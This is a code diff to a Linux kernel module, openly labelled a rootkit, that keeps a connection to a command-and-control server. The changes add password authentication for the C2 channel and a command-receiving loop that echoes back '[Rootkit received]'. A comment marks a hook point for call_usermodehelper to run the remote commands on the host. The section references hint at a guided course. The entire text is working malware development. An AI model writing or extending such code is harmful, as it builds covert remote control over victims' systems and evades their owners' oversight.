@@ -5,6 +5,7 @@
 #include <linux/net.h>
 #include <linux/inet.h>
 #include <net/sock.h>
+#include <linux/types.h> // [ADDED] For bool type support
 
 #define RETRY_DELAY 5
 
@@ -61,7 +62,7 @@ static int connection_thread(void *data)
     struct msghdr msg = { 0 };
     struct kvec   vec = { 0 };
     char buf[256];
-    int  ret;
+    int   ret;
 
     while (!kthread_should_stop()) {
         ret = do_connect();
@@ -74,6 +75,11 @@ static int connection_thread(void *data)
 
         pr_info("wlkom: connected to C2 %s:%d\n", c2_ip, c2_port);
 
+        /* * [ADDED] CHANNELS SECURITY & PARSING 
+         * Track authentication state before processing commands.
+         */
+        bool authenticated = false;
+
         while (!kthread_should_stop()) {
             memset(buf, 0, sizeof(buf));
             vec.iov_base = buf;
@@ -81,6 +87,46 @@ static int connection_thread(void *data)
             ret = kernel_recvmsg(conn_sock, &msg, &vec, 1, vec.iov_len, 0);
             if (ret == 0 || ret < 0)
                 break;
+
+            // Strip newline characters for clean string comparison
+            buf[strcspn(buf, "\r\n")] = 0;
+
+            /* [ADDED] Phase 1: Handle network authentication (Section 7.8) */
+            if (!authenticated) {
+                if (strncmp(buf, "AUTH ", 5) == 0) {
+                    char *provided_pass = buf + 5;
+                    // Compare against the insmod variable configuration
+                    if (strcmp(provided_pass, password) == 0) {
+                        authenticated = true;
+                        
+                        // Send success confirmation back to the C2
+                        struct msghdr send_msg = { 0 };
+                        struct kvec send_vec = { 0 };
+                        char *ok_payload = "AUTH_OK\n";
+                        
+                        send_vec.iov_base = ok_payload;
+                        send_vec.iov_len  = strlen(ok_payload);
+                        kernel_sendmsg(conn_sock, &send_msg, &send_vec, 1, send_vec.iov_len, 0);
+                        continue;
+                    }
+                }
+                // Disconnect if unauthorized or unexpected payload received
+                pr_err("wlkom: Network authentication failed. Dropping connection.\n");
+                break; 
+            }
+
+            /* * [ADDED] Phase 2: Processing Commands (Section 7.9 Skeleton) 
+             * Temporary execution echo to confirm transmission channel functionality.
+             * Safe hook location for call_usermodehelper implementation.
+             */
+            struct msghdr reply_msg = { 0 };
+            struct kvec reply_vec = { 0 };
+            char echo_buf[BUF_SIZE + 32];
+            
+            snprintf(echo_buf, sizeof(echo_buf), "[Rootkit received]: %s\n", buf);
+            reply_vec.iov_base = echo_buf;
+            reply_vec.iov_len  = strlen(echo_buf);
+            kernel_sendmsg(conn_sock, &reply_msg, &reply_vec, 1, reply_vec.iov_len, 0);
         }
 
         kernel_sock_shutdown(conn_sock, SHUT_RDWR);
